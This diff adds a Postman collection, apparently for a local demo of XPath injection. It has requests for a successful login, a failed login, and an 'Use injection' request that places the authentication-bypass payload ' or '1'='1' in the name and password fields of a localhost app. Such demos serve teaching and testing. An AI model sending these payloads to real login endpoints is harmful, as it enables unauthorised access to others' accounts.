@@ -1,0 +1,94 @@
+{
+	"info": {
+		"_postman_id": "d4be6409-47f6-4f3a-bc0c-cb1765e047da",
+		"name": "X-path injection",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "16179958"
+	},
+	"item": [
+		{
+			"name": "Successful authorization",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8080/?name='TestUser'&password='test'",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						""
+					],
+					"query": [
+						{
+							"key": "name",
+							"value": "'TestUser'"
+						},
+						{
+							"key": "password",
+							"value": "'test'"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Failed authorization",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8080/?name='test'&password='test'",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						""
+					],
+					"query": [
+						{
+							"key": "name",
+							"value": "'test'"
+						},
+						{
+							"key": "password",
+							"value": "'test'"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Use injection",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8080?name='inject' or '1'='1'&password='inject' or '1'='1'",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"query": [
+						{
+							"key": "name",
+							"value": "'inject' or '1'='1'"
+						},
+						{
+							"key": "password",
+							"value": "'inject' or '1'='1'"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
